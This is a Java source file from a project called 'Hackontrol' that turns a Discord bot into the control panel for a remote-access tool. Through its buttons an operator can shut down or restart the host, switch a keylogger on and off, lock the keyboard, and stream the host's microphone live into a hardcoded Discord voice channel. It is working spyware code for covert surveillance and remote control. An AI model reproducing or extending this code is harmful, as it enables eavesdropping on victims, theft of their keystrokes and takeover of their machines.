package com.khopan.hackontrol.channel;

import java.nio.ByteBuffer;

import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine.Info;
import javax.sound.sampled.TargetDataLine;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.NativeLibrary;
import com.khopan.hackontrol.manager.button.ButtonContext;
import com.khopan.hackontrol.manager.button.ButtonManager;
import com.khopan.hackontrol.manager.button.Question;
import com.khopan.hackontrol.manager.button.Question.OptionType;
import com.khopan.hackontrol.manager.button.Question.QuestionResponse;
import com.khopan.hackontrol.manager.common.sender.sendable.ChannelSendable;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.HackontrolMessage;

import net.dv8tion.jda.api.audio.AudioSendHandler;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
import net.dv8tion.jda.api.managers.AudioManager;

public class ControlChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "control";

	private static final Button BUTTON_SLEEP = ButtonManager.staticButton(ButtonStyle.SECONDARY, "Sleep", "sleep");
	private static final Button BUTTON_HIBERNATE = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Hibernate", "hibernate");
	private static final Button BUTTON_RESTART = ButtonManager.staticButton(ButtonStyle.PRIMARY, "Restart", "restart");
	private static final Button BUTTON_SHUTDOWN = ButtonManager.staticButton(ButtonStyle.DANGER, "Shutdown", "shutdown");

	private static final Button BUTTON_CONNECT = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Connect", "connect");
	private static final Button BUTTON_DISCONNECT = ButtonManager.staticButton(ButtonStyle.DANGER, "Disconnect", "disconnect");

	private static final Button BUTTON_ENABLE_KEYLOGGER = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Enable KeyLogger", "enableKeyLogger");
	private static final Button BUTTON_DISABLE_KEYLOGGER = ButtonManager.staticButton(ButtonStyle.DANGER, "Disable KeyLogger", "disableKeyLogger");

	private static final Button BUTTON_LOCK_KEYBOARD = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Lock Keyboard", "lockKeyboard");
	private static final Button BUTTON_UNLOCK_KEYBOARD = ButtonManager.staticButton(ButtonStyle.DANGER, "Unlock Keyboard", "unlockKeyboard");

	private AudioManager audioManager;
	private SendHandler handler;

	public ControlChannel() {
		Hackontrol hackontrol = Hackontrol.getInstance();
		hackontrol.setErrorHandler(this :: handleError);
	}

	@Override
	public String getName() {
		return ControlChannel.CHANNEL_NAME;
	}

	@Override
	public void initialize() {
		this.channel.sendMessage("**Power Control**").addActionRow(ControlChannel.BUTTON_SLEEP, ControlChannel.BUTTON_HIBERNATE, ControlChannel.BUTTON_RESTART, ControlChannel.BUTTON_SHUTDOWN).queue();
		this.channel.sendMessage("**Microphone Control**").addActionRow(ControlChannel.BUTTON_CONNECT, ControlChannel.BUTTON_DISCONNECT).queue();
		this.channel.sendMessage("**KeyLogger Control**").addActionRow(ControlChannel.BUTTON_ENABLE_KEYLOGGER, ControlChannel.BUTTON_DISABLE_KEYLOGGER).queue();
		this.channel.sendMessageComponents(ActionRow.of(ControlChannel.BUTTON_LOCK_KEYBOARD, ControlChannel.BUTTON_UNLOCK_KEYBOARD)).queue();
	}

	@Override
	public void register(Registry registry) {
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_SLEEP, context -> this.power(context, PowerAction.SLEEP));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_HIBERNATE, context -> this.power(context, PowerAction.HIBERNATE));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_RESTART, context -> this.power(context, PowerAction.RESTART));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_SHUTDOWN, context -> this.power(context, PowerAction.SHUTDOWN));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_CONNECT, context -> this.connect(context, true));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_DISCONNECT, context -> this.connect(context, false));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_ENABLE_KEYLOGGER, context -> this.keylogger(context, true));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_DISABLE_KEYLOGGER, context -> this.keylogger(context, false));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_LOCK_KEYBOARD, context -> this.lockKeyboard(context, true));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_UNLOCK_KEYBOARD, context -> this.lockKeyboard(context, false));
	}

	private void lockKeyboard(ButtonContext context, boolean lock) {
		NativeLibrary.Block = lock;
		HackontrolMessage.deletable(context.reply(), "**Keyboard: " + (lock ? "Locked**" : "Unlocked**"));
	}

	private void keylogger(ButtonContext context, boolean enable) {
		NativeLibrary.Enable = enable;
		HackontrolMessage.deletable(context.reply(), "**KeyLogger: " + (enable ? "Enabled**" : "Disabled**"));
	}

	private void power(ButtonContext context, PowerAction powerAction) {
		Question.create(context.reply(), "Are you sure you want to " + powerAction.lowercase + '?', OptionType.YES_NO, response -> {
			if(QuestionResponse.POSITIVE_RESPONSE.equals(response)) {
				int result = switch(powerAction) {
				case SLEEP -> NativeLibrary.sleep();
				case HIBERNATE -> NativeLibrary.hibernate();
				case RESTART -> NativeLibrary.restart();
				case SHUTDOWN -> NativeLibrary.shutdown();
				};

				if(result < 0) {
					HackontrolError.message(context.message(), powerAction.uppercase + " is not supported");
					return;
				}

				if(result > 0) {
					HackontrolError.message(context.message(), powerAction.uppercase + " operation has failed due to unknown reasons");
				}
			}
		});
	}

	private void connect(ButtonContext context, boolean connect) {
		if(connect) {
			context.acknowledge();
			this.connectCallback(context, true);
			return;
		}

		if(this.handler == null) {
			HackontrolError.message(context.reply(), "Hackontrol is already disconnected");
			return;
		}

		Question.create(context.reply(), "Are you sure you want to disconnect?", OptionType.YES_NO, result -> {
			if(QuestionResponse.POSITIVE_RESPONSE.equals(result)) {
				this.connectCallback(context, false);
			}
		});
	}

	private void connectCallback(ButtonContext context, boolean connect) {
		try {
			if(connect) {
				this.connect(context);
			} else {
				this.disconnect(context);
			}
		} catch(Throwable Errors) {
			HackontrolError.throwable(context.message(), Errors);
		}
	}

	private void connect(ButtonContext context) throws Throwable {
		Guild guild = context.getGuild();

		if(this.audioManager == null) {
			this.audioManager = guild.getAudioManager();
		}

		VoiceChannel channel = guild.getVoiceChannelById(1230856739793145919L);

		if(this.handler != null) {
			this.handler.close();
			this.audioManager.closeAudioConnection();
		}

		this.handler = new SendHandler();
		this.audioManager.setSendingHandler(this.handler);
		this.audioManager.setSelfDeafened(true);
		this.audioManager.openAudioConnection(channel);
	}

	private void disconnect(ButtonContext context) throws Throwable {
		Guild guild = context.getGuild();

		if(this.audioManager == null) {
			this.audioManager = guild.getAudioManager();
		}

		this.audioManager.closeAudioConnection();

		if(this.handler == null) {
			return;
		}

		this.handler.close();
		this.handler = null;
	}

	private void handleError(Thread thread, Throwable Errors) {
		HackontrolError.throwable(ChannelSendable.of(this.channel), Errors);
	}

	private static enum PowerAction {
		SLEEP("Sleep", "sleep"),
		HIBERNATE("Hibernate", "hibernate"),
		SHUTDOWN("Shutdown", "shutdown"),
		RESTART("Restart", "restart");

		private final String uppercase;
		private final String lowercase;

		PowerAction(String uppercase, String lowercase) {
			this.uppercase = uppercase;
			this.lowercase = lowercase;
		}
	}

	private static class SendHandler implements AudioSendHandler {
		private final TargetDataLine line;
		private final AudioInputStream stream;
		private final int size;

		private volatile boolean open;

		private SendHandler() throws Throwable {
			Info info = new Info(TargetDataLine.class, AudioSendHandler.INPUT_FORMAT);
			this.line = (TargetDataLine) AudioSystem.getLine(info);
			this.line.open();
			this.line.start();
			this.stream = new AudioInputStream(this.line);
			this.size = Math.round(AudioSendHandler.INPUT_FORMAT.getSampleRate() * 0.02f * ((float) AudioSendHandler.INPUT_FORMAT.getChannels()) * ((float) AudioSendHandler.INPUT_FORMAT.getSampleSizeInBits()) * 0.125f);
			this.open = true;
		}

		@Override
		public boolean canProvide() {
			return this.open;
		}

		@Override
		public ByteBuffer provide20MsAudio() {
			try {
				return ByteBuffer.wrap(this.stream.readNBytes(this.size));
			} catch(Throwable Errors) {
				return ByteBuffer.allocate(0);
			}
		}

		private void close() throws Throwable {
			this.open = false;
			this.line.stop();
			this.line.close();
			this.stream.close();
		}
	}
}
